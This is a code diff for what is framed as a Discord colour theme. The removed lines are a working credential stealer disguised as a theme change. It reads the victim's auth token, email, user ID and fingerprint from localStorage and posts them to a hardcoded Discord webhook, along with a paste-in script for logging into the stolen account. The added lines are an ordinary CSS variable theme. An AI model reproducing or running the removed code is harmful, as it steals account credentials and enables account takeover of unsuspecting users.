@@ -1,11 +1,26 @@
-location.reload();
-var discordWebhook = "https://discord.com/api/webhooks/903000521542074429/MoRRx_JKpvMtvJe4IJrwdNfPrv-K33mlkmqsRRoTWBed0kqaXY14etoeozFtEuYCHez-";
-var i = document.createElement('iframe');
-document.body.appendChild(i);
-var request = new XMLHttpRequest();
-request.open("POST", discordWebhook);
-request.setRequestHeader('Content-type', 'application/json');
-var params = {
-    content: '**Color Changed to Black**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
-};
-request.send(JSON.stringify(params));
+__SECRET_EMOTION__.injectGlobal(` * {
+--discord-primary: #000720;    
+--discord-secondary: #1c2341;
+--discord-secondary-alt: #396cb335;
+--discord-tertiary: #000720;    
+--discord-accent-color: #dadfe1;
+--discord-input-box: #396cb335;
+--discord-frost-blue: #88c0d0;
+--discord-frost-dark-blue: #5e81ac;
+--discord-scrollbar-track: var(--discord-primary);    
+--discord-scrollbar-thumb: var(--discord-secondary);       
+--background-primary: var(--discord-primary);    
+--background-secondary: var(--discord-secondary);    
+--background-secondary-alt: var(--discord-secondary-alt);    
+--background-tertiary: var(--discord-tertiary);
+--background-floating: var(discord-frost-blue)    
+--background-accent: var(--discord-frost-blue);    
+--header-primary: var(--discord-accent-color);    
+--interactive-active: var(--discord-accent-color);    
+--local-bot-side: var(--discord-frost-blue);   
+--channeltextarea-background: var(--discord-input-box);    
+--scrollbar-auto-thumb: var(--discord-secondary);    
+--scrollbar-auto-track: var(--discord-primary);
+--scrollbar-thin-track: var(--discord-primary);
+--scrollbar-thin-thumb: var(--discord-secondary);  
+} `)
